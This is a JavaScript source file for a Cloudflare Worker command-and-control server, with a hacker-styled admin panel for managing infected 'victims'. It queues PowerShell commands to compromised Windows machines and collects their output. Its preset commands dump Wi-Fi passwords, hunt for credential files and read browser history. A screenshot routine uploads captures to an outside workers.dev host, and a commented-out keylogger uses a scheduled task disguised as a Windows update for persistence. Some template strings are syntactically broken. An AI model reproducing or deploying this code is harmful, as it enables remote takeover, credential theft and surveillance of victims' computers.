// Ultimate C2 Server Worker - Complete Version
export default {
async fetch(request, env) {
const url = new URL(request.url);

const corsHeaders = {
'Access-Control-Allow-Origin': '*',
'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
'Access-Control-Allow-Headers': '*',
};

if (request.method === 'OPTIONS') {
return new Response(null, { headers: corsHeaders });
}

// Admin Panel
if (url.pathname === '/admin') {
return new Response(getAdminHTML(), {
headers: { ...corsHeaders, 'Content-Type': 'text/html' }
});
}

// Beacon endpoint
if (url.pathname === '/beacon') {
const victimID = request.headers.get('X-Victim-ID');

if (victimID) {
const timestamp = new Date().toISOString();
const ip = request.headers.get('CF-Connecting-IP') || 'Unknown';
const country = request.headers.get('CF-IPCountry') || 'Unknown';
const userAgent = request.headers.get('User-Agent') || 'Unknown';

await env.C2_STORAGE.put(`victim:${victimID}:last_seen`, timestamp);
await env.C2_STORAGE.put(`victim:${victimID}:info`, JSON.stringify({
ip, country, userAgent, firstSeen: timestamp
}));
}

const cmd = await env.C2_STORAGE.get(`victim:${victimID}:command`);
if (cmd) {
await env.C2_STORAGE.delete(`victim:${victimID}:command`);
return new Response(cmd, { headers: corsHeaders });
}

return new Response('idle', { headers: corsHeaders });
}

// Result endpoint
if (url.pathname === '/result' && request.method === 'POST') {
const victimID = request.headers.get('X-Victim-ID');
const result = await request.text();
const timestamp = new Date().toISOString();

await env.C2_STORAGE.put(`victim:${victimID}:result`, JSON.stringify({
result, timestamp
}));

return new Response('ok', { headers: corsHeaders });
}

// Upload endpoint (for files/screenshots)
if (url.pathname === '/upload' && request.method === 'POST') {
const victimID = request.headers.get('X-Victim-ID');
const filename = request.headers.get('X-Filename') || 'file';
const dataType = request.headers.get('X-Data-Type') || 'file';
const content = await request.text();
const timestamp = new Date().toISOString();

const fileKey = `file:${victimID}:${timestamp}:${filename}`;
await env.C2_STORAGE.put(fileKey, JSON.stringify({
content, timestamp, filename, dataType
}));

return new Response('ok', { headers: corsHeaders });
}

// API: List victims
if (url.pathname === '/api/victims') {
const list = await env.C2_STORAGE.list({ prefix: 'victim:' });
const victims = {};

for (const key of list.keys) {
const parts = key.name.split(':');
const id = parts[1];
const field = parts[2];

if (!victims[id]) victims[id] = { id };

const value = await env.C2_STORAGE.get(key.name);
try {
victims[id][field] = JSON.parse(value);
} catch {
victims[id][field] = value;
}
}

return new Response(JSON.stringify(Object.values(victims)), {
headers: { ...corsHeaders, 'Content-Type': 'application/json' }
});
}

// API: Send command
if (url.pathname === '/api/command' && request.method === 'POST') {
const { victimID, command } = await request.json();
await env.C2_STORAGE.put(`victim:${victimID}:command`, command);
return new Response('ok', { headers: corsHeaders });
}

// API: Get result
if (url.pathname === '/api/result') {
const victimID = url.searchParams.get('id');
const data = await env.C2_STORAGE.get(`victim:${victimID}:result`);

if (data) {
const parsed = JSON.parse(data);
return new Response(JSON.stringify(parsed), {
headers: { ...corsHeaders, 'Content-Type': 'application/json' }
});
}

return new Response(JSON.stringify({ result: 'No result yet', timestamp: null }), {
headers: { ...corsHeaders, 'Content-Type': 'application/json' }
});
}

// API: Clear result
if (url.pathname === '/api/clear_result' && request.method === 'POST') {
const { victimID } = await request.json();
await env.C2_STORAGE.delete(`victim:${victimID}:result`);
return new Response('ok', { headers: corsHeaders });
}

// API: List files
if (url.pathname === '/api/files') {
const victimID = url.searchParams.get('id');
const list = await env.C2_STORAGE.list({ prefix: `file:${victimID}:` });

const files = [];
for (const key of list.keys) {
const data = await env.C2_STORAGE.get(key.name);
const parsed = JSON.parse(data);
files.push({
key: key.name,
filename: parsed.filename,
timestamp: parsed.timestamp,
dataType: parsed.dataType
});
}

return new Response(JSON.stringify(files), {
headers: { ...corsHeaders, 'Content-Type': 'application/json' }
});
}

// API: Get file
if (url.pathname === '/api/getfile') {
const key = url.searchParams.get('key');
const data = await env.C2_STORAGE.get(key);

if (data) {
return new Response(data, {
headers: { ...corsHeaders, 'Content-Type': 'application/json' }
});
}

return new Response('File not found', { status: 404 });
}

return new Response('Not Found', { status: 404 });
}
};

function getAdminHTML() {
return `
<!DOCTYPE html>
<html>

<head>
    <title>C2 Command Center</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Consolas', 'Monaco', monospace;
            background: #0a0a0a;
            color: #00ff00;
            padding: 20px;
            line-height: 1.6;
        }

        .header {
            background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
            padding: 25px;
            border-radius: 10px;
            margin-bottom: 25px;
            border: 2px solid #00ff00;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
        }

        h1 {
            color: #00ff00;
            font-size: 32px;
            text-shadow: 0 0 10px #00ff00;
            margin-bottom: 10px;
        }

        .status-bar {
            display: flex;
            gap: 20px;
            align-items: center;
            margin-top: 15px;
            flex-wrap: wrap;
        }

        .status-item {
            background: #1a1a1a;
            padding: 10px 20px;
            border-radius: 5px;
            border: 1px solid #00ff00;
        }

        .btn {
            padding: 10px 25px;
            background: #00ff00;
            color: #000;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            font-family: inherit;
            transition: all 0.3s;
        }

        .btn:hover {
            background: #00cc00;
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.5);
            transform: translateY(-2px);
        }

        .btn-danger {
            background: #ff0000;
            color: #fff;
        }

        .btn-danger:hover {
            background: #cc0000;
            box-shadow: 0 0 15px rgba(255, 0, 0, 0.5);
        }

        .victim-card {
            background: #1a1a1a;
            border: 2px solid #00ff00;
            border-radius: 10px;
            padding: 20px;
            margin: 15px 0;
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.2);
        }

        .victim-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            padding-bottom: 15px;
            border-bottom: 1px solid #00ff00;
        }

        .victim-id {
            font-size: 20px;
            font-weight: bold;
            color: #00ff00;
        }

        .status-badge {
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
        }

        .online {
            background: #00ff00;
            color: #000;
        }

        .offline {
            background: #ff0000;
            color: #fff;
        }

        .victim-info {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 10px;
            margin-bottom: 15px;
            font-size: 13px;
        }

        .info-item {
            background: #0d0d0d;
            padding: 8px 12px;
            border-radius: 5px;
            border-left: 3px solid #00ff00;
        }

        .info-label {
            color: #00cc00;
            font-size: 11px;
            text-transform: uppercase;
        }

        .tabs {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
            border-bottom: 2px solid #00ff00;
        }

        .tab {
            padding: 10px 20px;
            background: #0d0d0d;
            border: 1px solid #00ff00;
            border-bottom: none;
            border-radius: 5px 5px 0 0;
            cursor: pointer;
            transition: all 0.3s;
        }

        .tab:hover {
            background: #1a1a1a;
        }

        .tab.active {
            background: #00ff00;
            color: #000;
        }

        .tab-content {
            display: none;
            background: #0d0d0d;
            padding: 15px;
            border-radius: 8px;
        }

        .tab-content.active {
            display: block;
        }

        .command-input {
            width: 100%;
            background: #000;
            border: 2px solid #00ff00;
            color: #00ff00;
            padding: 12px;
            border-radius: 5px;
            font-family: inherit;
            font-size: 14px;
            margin-bottom: 10px;
        }

        .command-input:focus {
            outline: none;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
        }

        .button-group {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }

        .btn-small {
            padding: 8px 15px;
            font-size: 13px;
        }

        .result-box {
            background: #000;
            border: 2px solid #00ff00;
            border-radius: 8px;
            padding: 15px;
            margin-top: 15px;
            max-height: 400px;
            overflow-y: auto;
            white-space: pre-wrap;
            word-wrap: break-word;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            line-height: 1.5;
            display: none;
        }

        .result-box.visible {
            display: block;
        }

        .result-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
            padding-bottom: 10px;
            border-bottom: 1px solid #00ff00;
        }

        .result-timestamp {
            color: #00cc00;
            font-size: 12px;
        }

        .close-btn {
            background: #ff0000;
            color: #fff;
            border: none;
            padding: 5px 15px;
            border-radius: 3px;
            cursor: pointer;
            font-size: 12px;
        }

        .command-categories {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-top: 15px;
        }

        .command-category {
            background: #1a1a1a;
            border: 1px solid #00ff00;
            border-radius: 8px;
            padding: 15px;
        }

        .category-title {
            color: #00ff00;
            font-size: 14px;
            font-weight: bold;
            margin-bottom: 10px;
            text-transform: uppercase;
        }

        .cmd-btn {
            display: block;
            width: 100%;
            padding: 8px;
            margin: 5px 0;
            background: #0d0d0d;
            border: 1px solid #00ff00;
            color: #00ff00;
            border-radius: 5px;
            cursor: pointer;
            font-size: 12px;
            font-family: inherit;
            text-align: left;
            transition: all 0.2s;
        }

        .cmd-btn:hover {
            background: #00ff00;
            color: #000;
        }

        .screenshot-viewer {
            max-width: 100%;
            border: 2px solid #00ff00;
            border-radius: 8px;
            margin-top: 15px;
        }

        .file-list {
            max-height: 400px;
            overflow-y: auto;
        }

        .file-item {
            background: #1a1a1a;
            padding: 10px;
            margin: 5px 0;
            border-radius: 5px;
            border-left: 3px solid #00ff00;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .file-info {
            flex: 1;
        }

        .file-name {
            color: #00ff00;
            font-weight: bold;
        }

        .file-time {
            color: #666;
            font-size: 11px;
        }

        .no-victims {
            text-align: center;
            padding: 50px;
            color: #666;
            font-size: 18px;
        }

        ::-webkit-scrollbar {
            width: 10px;
        }

        ::-webkit-scrollbar-track {
            background: #0d0d0d;
        }

        ::-webkit-scrollbar-thumb {
            background: #00ff00;
            border-radius: 5px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: #00cc00;
        }
    </style>
</head>

<body>
    <div class="header">
        <h1>⚡ C2 COMMAND CENTER</h1>
        <div class="status-bar">
            <div class="status-item">
                <span id="victimCount">Loading...</span>
            </div>
            <div class="status-item">
                <span id="serverStatus">🟢 Server Online</span>
            </div>
            <button class="btn" onclick="refreshVictims()">🔄 Refresh Now</button>
            <button class="btn" onclick="toggleAutoRefresh()">
                <span id="autoRefreshText">⏸️ Pause Auto-Refresh</span>
            </button>
        </div>
    </div>

    <div id="victims"></div>

    <script>
        let autoRefresh = true;
        let refreshInterval = null;

        loadVictims();
        refreshInterval = setInterval(() => {
            if (autoRefresh) loadVictims();
        }, 300000); // 5 minutes

        function toggleAutoRefresh() {
            autoRefresh = !autoRefresh;
            document.getElementById('autoRefreshText').textContent = autoRefresh ?
                '⏸️ Pause Auto-Refresh' : '▶️ Resume Auto-Refresh';
        }

        function refreshVictims() {
            loadVictims();
        }

        async function loadVictims() {
            try {
                const res = await fetch('/api/victims');
                const victims = await res.json();

                document.getElementById('victimCount').textContent =
                    '💀 ' + victims.length + ' Victim(s) Connected';


                if (victims.length === 0) {
                    document.getElementById('victims').innerHTML =
                        '<div class="no-victims">⏳ No victims connected yet... Waiting for infections.</div>';
                    return;
                }

                const html = victims.map(v => generateVictimCard(v)).join('');
                document.getElementById('victims').innerHTML = html;
            } catch (e) {
                console.error('Error loading victims:', e);
            }
        }

        function generateVictimCard(v) {
            const lastSeen = new Date(v.last_seen);
            const timeDiff = Math.floor((Date.now() - lastSeen) / 1000);
            const isOnline = timeDiff < 120;
            const statusClass = isOnline ? 'online' : 'offline';
            const statusText = isOnline ? '🟢 ONLINE' : '🔴 OFFLINE';

            return
            <div class="victim-card" id="victim-\${v.id}">
                <div class="victim-header">
                    <div class="victim-id">🎯 VICTIM: \${v.id}</div>
                    <div class="status-badge \${statusClass}">\${statusText}</div>
                </div>

                <div class="victim-info">
                    <div class="info-item">
                        <div class="info-label">Last Seen</div>
                        <div>\${lastSeen.toLocaleString()} (\${timeDiff}s ago)</div>
                    </div>
                    <div class="info-item">
                        <div class="info-label">IP Address</div>
                        <div>\${v.info?.ip || 'Unknown'}</div>
                    </div>
                    <div class="info-item">
                        <div class="info-label">Country</div>
                        <div>\${v.info?.country || 'Unknown'}</div>
                    </div>
                    <div class="info-item">
                        <div class="info-label">User Agent</div>
                        <div style="font-size: 11px;">\${v.info?.userAgent || 'Unknown'}</div>
                    </div>
                </div>

                <div class="tabs">
                    <div class="tab active" onclick="switchTab('\${v.id}', 'commands')">📟 Commands</div>
                    <div class="tab" onclick="switchTab('\${v.id}', 'quickcmds')">⚡ Quick Commands</div>
                    <div class="tab" onclick="switchTab('\${v.id}', 'files')">📁 Files</div>
                    <div class="tab" onclick="switchTab('\${v.id}', 'keylog')">⌨️ Keylogger</div>
                </div>

                <div id="tab-commands-\${v.id}" class="tab-content active">
                    <input type="text"
                        class="command-input"
                        id="cmd_\${v.id}"
                        placeholder="Enter PowerShell command..."
                        onkeypress="if(event.key==='Enter') sendCmd('\${v.id}')" />

                    <div class="button-group">
                        <button class="btn btn-small" onclick="sendCmd('\${v.id}')">⚡ Execute</button>
                        <button class="btn btn-small" onclick="getResult('\${v.id}')">📋 Get Result</button>
                        <button class="btn btn-small" onclick="clearResult('\${v.id}')">🗑️ Clear</button>
                        <button class="btn btn-small btn-danger" onclick="killVictim('\${v.id}')">💀 Remove All</button>
                    </div>

                    <div class="result-box" id="result_\${v.id}">
                        <div class="result-header">
                            <div class="result-timestamp" id="time_\${v.id}"></div>
                            <button class="close-btn" onclick="hideResult('\${v.id}')">✖ Close</button>
                        </div>
                        <div id="output_\${v.id}"></div>
                    </div>
                </div>

                <div id="tab-quickcmds-\${v.id}" class="tab-content">
                    \${generateQuickCommands(v.id)}
                </div>

                <div id="tab-files-\${v.id}" class="tab-content">
                    <div class="button-group" style="margin-bottom: 15px;">
                        <button class="btn btn-small" onclick="loadFiles('\${v.id}')">🔄 Refresh Files</button>
                        <button class="btn btn-small" onclick="takeScreenshot('\${v.id}')">📸 Take Screenshot</button>
                        <button class="btn btn-small" onclick="browseFiles('\${v.id}')">📂 Browse Files</button>
                    </div>
                    <div class="file-list" id="files_\${v.id}">
                        <div style="text-align: center; color: #666;">No files yet. Click "Refresh Files" to check.</div>
                    </div>
                </div>

                <div id="tab-keylog-\${v.id}" class="tab-content">
                    <div class="button-group">
                        <button class="btn btn-small" onclick="installKeylogger('\${v.id}')">⚡ Install Keylogger</button>
                        <button class="btn btn-small" onclick="checkKeylogger('\${v.id}')">🔍 Check Status</button>
                        <button class="btn btn-small btn-danger" onclick="removeKeylogger('\${v.id}')">🗑️ Remove Keylogger</button>
                    </div>
                    <div class="result-box visible" id="keylog_\${v.id}" style="margin-top: 15px;">
                        <div style="color: #666; text-align: center;">Keylogger not installed yet</div>
                    </div>
                </div>
            </div>
                ;
        }

        function generateQuickCommands(id) {
            const categories = {
                'System Info': [
                    { name: 'Who Am I', cmd: 'whoami' },
                    { name: 'Hostname', cmd: 'hostname' },
                    { name: 'System Info', cmd: 'systeminfo | Select-String "OS Name","OS Version","System Type"' },
                    { name: 'Computer Info', cmd: 'Get-ComputerInfo | Select-Object CsName,WindowsVersion,OsArchitecture' },
                    { name: 'Check Admin', cmd: '([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)' }
                ],
                'Network': [
                    { name: 'IP Config', cmd: 'ipconfig /all' },
                    { name: 'Network Adapters', cmd: 'Get-NetAdapter | Select-Object Name,Status,MacAddress' },
                    { name: 'WiFi Passwords', cmd: '(netsh wlan show profiles)|Select-String ":"| %{($_.Line -split ":")[1].Trim()}|%{(netsh wlan show profile name="$_" key=clear)}|Select-String "Key Content"|%{($_.Line -split ":")[1].Trim()}' },
                    { name: 'Active Connections', cmd: 'netstat -ano | Select-String ESTABLISHED' },
                    { name: 'DNS Cache', cmd: 'Get-DnsClientCache | Select-Object Entry,Data' }
                ],
                'Processes': [
                    { name: 'List Processes', cmd: 'Get-Process | Select-Object Name,Id,CPU,WorkingSet | Sort-Object WorkingSet -Descending | Select-Object -First 20' },
                    { name: 'Running Services', cmd: 'Get-Service | Where-Object {$_.Status -eq "Running"} | Select-Object Name,DisplayName' },
                    { name: 'Startup Programs', cmd: 'Get-CimInstance Win32_StartupCommand | Select-Object Name,Command,Location' }
                ],
                'Files': [
                    { name: 'Documents', cmd: 'Get-ChildItem "$env:USERPROFILE\\\\Documents" -Recurse -File -ErrorAction SilentlyContinue | Select-Object Name,Length,LastWriteTime -First 50' },
                    { name: 'Desktop', cmd: 'Get-ChildItem "$env:USERPROFILE\\\\Desktop" -File | Select-Object Name,Length,LastWriteTime' },
                    { name: 'Downloads', cmd: 'Get-ChildItem "$env:USERPROFILE\\\\Downloads" -File | Select-Object Name,Length,LastWriteTime -First 50' },
                    { name: 'Find Passwords', cmd: 'Get-ChildItem C:\\\\Users -Recurse -Include *password*,*credential*,*secret* -File -ErrorAction SilentlyContinue | Select-Object FullName -First 20' }
                ],
                'Browser': [
                    { name: 'Chrome History', cmd: 'Get-Content "$env:LOCALAPPDATA\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\History" -ErrorAction SilentlyContinue | Select-String "http" -AllMatches | Select-Object -First 50' },
                    { name: 'Browser Paths', cmd: 'Get-ChildItem "$env:LOCALAPPDATA\\\\Google\\\\Chrome\\\\User Data\\\\Default","$env:LOCALAPPDATA\\\\Microsoft\\\\Edge\\\\User Data\\\\Default" -ErrorAction SilentlyContinue | Select-Object Name' }
                ],
                'Recon': [
                    { name: 'Installed Software', cmd: 'Get-ItemProperty HKLM:\\\\Software\\\\Wow6432Node\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\* | Select-Object DisplayName,DisplayVersion,Publisher | Where-Object {$_.DisplayName} | Sort-Object DisplayName' },
                    { name: 'Environment Vars', cmd: 'Get-ChildItem Env: | Select-Object Name,Value' },
                    { name: 'Disk Info', cmd: 'Get-PSDrive -PSProvider FileSystem | Select-Object Name,Used,Free,@{Name="Size(GB)";Expression={[math]::Round(($_.Used+$_.Free)/1GB,2)}}' },
                    { name: 'Users', cmd: 'Get-LocalUser | Select-Object Name,Enabled,LastLogon' }
                ]
            };

            let html = '<div class="command-categories">';
            for (const [category, commands] of Object.entries(categories)) {
                html +=
                    <div class="command-category">
                        <div class="category-title">\${category}</div>
                        \${commands.map(c =>
                            <button class="cmd-btn" onclick="quickCmd('\${id}', \\\`\${c.cmd}\\\`)">
                                \${c.name}
                            </button>
                        ).join('')}
                    </div>
                    ;
            }
            html += '</div>';
            return html;
        }

        function switchTab(id, tab) {
            const tabs = document.querySelectorAll('#victim-' + id + ' .tab');
            const contents = document.querySelectorAll('#victim-' + id + ' .tab-content');


            tabs.forEach(t => t.classList.remove('active'));
            contents.forEach(c => c.classList.remove('active'));

            event.target.classList.add('active');
            document
              .getElementById('tab-' + tab + '-' + id)
              .classList.add('active');

        }

        async function sendCmd(id) {
            const input = document.getElementById('cmd_' + id);
            const cmd = input.value.trim();

            if (!cmd) {
                alert('Please enter a command');
                return;
            }

            try {
                await fetch('/api/command', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ victimID: id, command: cmd })
                });

                input.value = '';

                const resultBox = document.getElementById('result_' + id);
                const output = document.getElementById('output_' + id);
                resultBox.classList.add('visible');
                output.textContent = '⏳ Command sent! Waiting for result (~60 seconds)...';

                setTimeout(() => getResult(id), 65000);
            } catch (e) {
                alert('Error sending command: ' + e.message);
            }
        }

        async function getResult(id) {
            try {
                const res = await fetch('/api/result?id=' + id);
                const data = await res.json();

                const resultBox = document.getElementById('result_' + id);
                const output = document.getElementById('output_' + id);
                const timestamp = document.getElementById('time_' + id);

                resultBox.classList.add('visible');

                if (data.result && data.result !== 'No result yet') {
                    output.textContent = data.result;
                    timestamp.textContent = 'Result from: ' + new Date(data.timestamp).toLocaleString();
                } else {
                    output.textContent = 'No result yet. Command may still be executing...';
                    timestamp.textContent = '';
                }
            } catch (e) {
                alert('Error getting result: ' + e.message);
            }
        }

        async function clearResult(id) {
            try {
                await fetch('/api/clear_result', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ victimID: id })
                });

                hideResult(id);
            } catch (e) {
                console.error('Error clearing result:', e);
            }
        }

        function hideResult(id) {
            const resultBox = document.getElementById('result_' + id);
            resultBox.classList.remove('visible');
        }

        function quickCmd(id, cmd) {
            const input = document.getElementById('cmd_' + id);
            input.value = cmd;
            sendCmd(id);
        }

        // ---------- helper ----------
function escapeHtml(str) {
    return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
}

// ---------- load files ----------
async function loadFiles(id) {
    try {
        var res = await fetch('/api/files?id=' + encodeURIComponent(id));
        var files = await res.json();

        var fileList = document.getElementById('files_' + id);
        if (!fileList) {
            throw new Error('File container not found');
        }

        if (!files || files.length === 0) {
            fileList.innerHTML =
                '<div style="text-align:center;color:#666;">No files uploaded yet.</div>';
            return;
        }

        var html = '';
        for (var i = 0; i < files.length; i++) {
            var f = files[i];

            html += ''
                + '<div class="file-item">'
                + '  <div class="file-info">'
                + '    <div class="file-name">' + escapeHtml(f.filename) + '</div>'
                + '    <div class="file-time">'
                +        new Date(f.timestamp).toLocaleString()
                + '      - Type: ' + escapeHtml(f.dataType)
                + '    </div>'
                + '  </div>'
                + '  <button class="btn btn-small" '
                + '    data-key="' + escapeHtml(f.key) + '" '
                + '    data-type="' + escapeHtml(f.dataType) + '">'
                + '    📥 View'
                + '  </button>'
                + '</div>';
        }

        fileList.innerHTML = html;

        // attach click handlers
        var buttons = fileList.querySelectorAll('button[data-key]');
        for (var j = 0; j < buttons.length; j++) {
            buttons[j].onclick = function () {
                viewFile(
                    this.getAttribute('data-key'),
                    this.getAttribute('data-type')
                );
            };
        }

    } catch (e) {
        alert('Error loading files: ' + e.message);
    }
}

// ---------- view file ----------
async function viewFile(key, dataType) {
    try {
        var res = await fetch('/api/getfile?key=' + encodeURIComponent(key));
        var data = await res.json();
        var parsed = JSON.parse(data);

        var win = window.open('', '_blank');
        if (!win) {
            throw new Error('Popup blocked');
        }

        if (dataType === 'screenshot') {
            win.document.write(
                '<html>'
              + '<head><title>Screenshot</title></head>'
              + '<body style="margin:0;background:#000;">'
              + '<img src="' + escapeHtml(parsed.content) + '" style="max-width:100%;height:auto;">'
              + '</body>'
              + '</html>'
            );
        } else {
            win.document.write(
                '<html>'
              + '<head><title>File Content</title></head>'
              + '<body style="background:#000;color:#0f0;font-family:monospace;padding:20px;">'
              + '<pre>' + escapeHtml(parsed.content) + '</pre>'
              + '</body>'
              + '</html>'
            );
        }

    } catch (e) {
        alert('Error viewing file: ' + e.message);
    }
}

function takeScreenshot(id) {
    var cmd =
        'Add-Type -AssemblyName System.Windows.Forms,System.Drawing\n' +
        '$screens = [Windows.Forms.Screen]::AllScreens\n' +
        '$top = ($screens.Bounds.Top | Measure-Object -Minimum).Minimum\n' +
        '$left = ($screens.Bounds.Left | Measure-Object -Minimum).Minimum\n' +
        '$width = ($screens.Bounds.Right | Measure-Object -Maximum).Maximum\n' +
        '$height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum\n' +
        '$bounds = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)\n' +
        '$bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height\n' +
        '$graphics = [Drawing.Graphics]::FromImage($bmp)\n' +
        '$graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)\n' +
        '$ms = New-Object IO.MemoryStream\n' +
        '$bmp.Save($ms, [Drawing.Imaging.ImageFormat]::Png)\n' +
        '$b64 = [Convert]::ToBase64String($ms.ToArray())\n' +
        '$graphics.Dispose()\n' +
        '$bmp.Dispose()'
        'Invoke-RestMethod -Uri "readme.sharansahu1604.workers.dev/upload" -Method POST -Headers @{"X-Victim-ID"="$env:COMPUTERNAME";"X-Filename"="screenshot.png";"X-Data-Type"="screenshot"} -Body "data:image/png;base64,$b64"
        `.trim()';

            const input = document.getElementById('cmd_' + id);
            input.value = cmd;
            alert('Screenshot command ready.');
        }

        function browseFiles(id) {
            const cmd = 'Get-ChildItem -Path C:\\\\ -Recurse -File -ErrorAction SilentlyContinue | Select-Object FullName,Length,LastWriteTime -First 100';
            quickCmd(id, cmd);
        }

//         function installKeylogger(id) {
//             const cmd = `
// $code = @"
// using System;
// using System.Runtime.InteropServices;
// using System.IO;
// using System.Text;
// using System.Windows.Forms;

// public class KeyLogger {
//     [DllImport("user32.dll")]
//     public static extern int GetAsyncKeyState(Int32 i);
    
//     public static void Main() {
//         string logFile = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "WindowsUpdate.log";
        
//         while(true) {
//             System.Threading.Thread.Sleep(100);
//             for(int i = 8; i < 255; i++) {
//                 int state = GetAsyncKeyState(i);
//                 if(state == 1 || state == -32767) {
//                     string key = ((Keys)i).ToString();
//                     File.AppendAllText(logFile, key + " ");
//                 }
//             }
//         }
//     }
// }
// "@

// Add-Type -TypeDefinition $code -ReferencedAssemblies System.Windows.Forms
// $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command "[KeyLogger]::Main()""
// $trigger = New-ScheduledTaskTrigger -AtLogOn
// Register-ScheduledTask -TaskName "WindowsUpdateCheck" -Action $action -Trigger $trigger -RunLevel Highest -Force
// Start-ScheduledTask -TaskName "WindowsUpdateCheck"
// "Keylogger installed and started"
//         `.trim();

//             quickCmd(id, cmd);
//         }

//         function checkKeylogger(id) {
//             const cmd = `
// $logFile = "$env:APPDATA\\WindowsUpdate.log"
// if (Test-Path $logFile) {
//     Get-Content $logFile -Tail 200
// } else {
//     "No keylog file found"
// }
//     `.trim();

//             quickCmd(id, cmd);
//         }


//         function removeKeylogger(id) {
//             const cmd = `
// Unregister-ScheduledTask -TaskName "WindowsUpdateCheck" -TaskPath "\\" -Confirm:$false -ErrorAction SilentlyContinue
// Remove-Item "$env:APPDATA\\WindowsUpdate.log" -Force -ErrorAction SilentlyContinue
// Write-Output "Keylogger removed"
//     `.trim();

//             quickCmd(id, cmd);
//         }


        async function killVictim(id) {
            if (!confirm('This will remove all data for this victim. Continue?')) return;

            try {
                const list = await fetch('/api/victims').then(r => r.json());
                const victim = list.find(v => v.id === id);

                // Would need delete endpoints in worker to fully implement
                alert('Kill function requires additional API endpoints for data deletion');
            } catch (e) {
                console.error('Error:', e);
            }
        }
    </script>
</body>

</html>
}
